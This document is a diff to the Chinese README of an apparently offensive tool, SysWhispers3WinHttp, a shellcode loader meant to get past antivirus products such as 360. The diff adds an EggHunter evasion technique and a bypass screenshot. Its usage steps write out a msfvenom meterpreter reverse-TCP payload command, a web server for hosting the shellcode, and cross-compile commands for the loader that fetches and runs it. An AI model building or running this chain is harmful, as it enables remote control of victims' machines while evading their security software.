@@ -7,9 +7,11 @@ SysWhispers3WinHttp 基于SysWhispers3增添WinHttp分离加载，在Linux下使
 
 ## 0x01 更新日志
 
-2023/06/06 支持64位GCC编译与Stager方式上线SliverC2，增添编译参数绕过静态检测。
+2024/06/20 增添MinGW下EggHunter技术，绕过对syscall指令的静态检测。
 
 2023/07/03 支持64位程序在Windows 7 x64上线。
+
+2023/06/06 支持64位GCC编译与Stager方式上线SliverC2，增添编译参数绕过静态检测。
 
 ## 0x02 使用
 
@@ -17,17 +19,20 @@ SysWhispers3WinHttp 基于SysWhispers3增添WinHttp分离加载，在Linux下使
 // 1. 使用msfvenom生成Shellcode（或使用CobaltStrike生成Stageless之Shellcode）
 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=x.x.x.x lport=4444 -f raw -o beacon.bin
 
-// 2. 使用python3开启Web服务（或使用CobaltStrike之Host File功能）
+// 2. 使用python3开启Web服务（或使用CobaltStrike之HostFile功能）
 python3 -m http.server
 
-// 3. 修改SysWhispers3WinHttp.c第40行IP地址，使用Linux64位GCC进行交叉编译
-x86_64-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls64.c SysWhispers3WinHttp.c -masm=intel -w -s -lwinhttp -O1
+// 3. 修改SysWhispers3WinHttp.c第72行IP地址，使用Linux64位GCC进行交叉编译
+x86_64-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls64.c SysWhispers3WinHttp.c -masm=intel -w -s -lwinhttp -lpsapi
 
-// ps. 或修改SysWhispers3WinHttp.c第4行头文件为syscalls.h，修改第40行IP地址，使用Linux32位GCC进行交叉编译
-i686-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls.c SysWhispers3WinHttp.c -masm=intel -w -s -lwinhttp
+// ps. 或修改SysWhispers3WinHttp.c第4行头文件为syscalls.h，修改第72行IP地址，使用Linux32位GCC进行交叉编译
+i686-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls.c SysWhispers3WinHttp.c -masm=intel -w -s -lwinhttp -lpsapi
 ```
 
 ## 0x03 演示
+
+360云安全计划（2024/06/21更新）
+![360云安全计划](https://github.com/huaigu4ng/SysWhispers3WinHttp/assets/128464183/a777d104-1f93-4e16-931c-0b2222c64504)
 
 360核晶（2023/06/06更新）
 ![360](https://github.com/huaigu4ng/SysWhispers3WinHttp/assets/128464183/f02a6de4-d6db-4012-91f8-e75df30f49ab)
